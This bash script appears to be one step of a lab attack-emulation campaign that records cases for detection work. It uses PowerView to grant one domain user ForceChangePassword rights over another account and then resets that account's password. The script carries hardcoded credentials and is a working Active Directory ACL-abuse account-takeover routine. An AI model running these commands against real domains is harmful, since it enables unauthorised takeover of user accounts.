#!/usr/bin/env bash
# T015 — ACL ForceChangePassword from ws01 (analyst_t1) using PowerView
# Grants self ForceChangePassword on analyst_t2, then resets it.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LIB="${SCRIPT_DIR}/../lib"
source "${LIB}/campaign-a-common.sh"

CASE_ID="CADRE-T015-FORCECHANGEPWD-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)

echo "=== T015 ForceChangePassword | ${CASE_ID} | T0=${T0} ==="

DC02="${DC02:-dc02.child.cadre.local}"
DOMAIN_CHILD="${DOMAIN_CHILD:-child.cadre.local}"
ATTACK_USER="${ATTACK_USER:-analyst_dfir}"
TARGET_USER="analyst_t2"
NEW_PWD='RedStrike_T015!'

CMD='
$pv = "C:\Tools\cadre-attack\PowerView.ps1";
if (-not (Test-Path $pv)) { throw "PowerView.ps1 not found" }
. $pv;
$ErrorActionPreference = "Stop";
$u = "'''"${DOMAIN_CHILD}\${ATTACK_USER}"'''";
$t = "'''"${TARGET_USER}"'''";
Add-DomainObjectAcl -TargetIdentity $t -PrincipalIdentity $u -Rights ForceChangePassword -DomainController "'''"${DC02}"'''" -Domain "'''"${DOMAIN_CHILD}"'''" -Verbose;
Set-DomainUserPassword -Identity $t -AccountPassword (ConvertTo-SecureString "'''"${NEW_PWD}"'''" -AsPlainText -Force) -DomainController "'''"${DC02}"'''" -Domain "'''"${DOMAIN_CHILD}"'''" -Verbose;
Write-Output "T015_OK: forced password change on $t"
'

ws01_exec_as analyst_t1 'T13r_An@lyst!' "$CMD"

cadre_export "${CASE_ID}" T015 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T015 run complete ==="
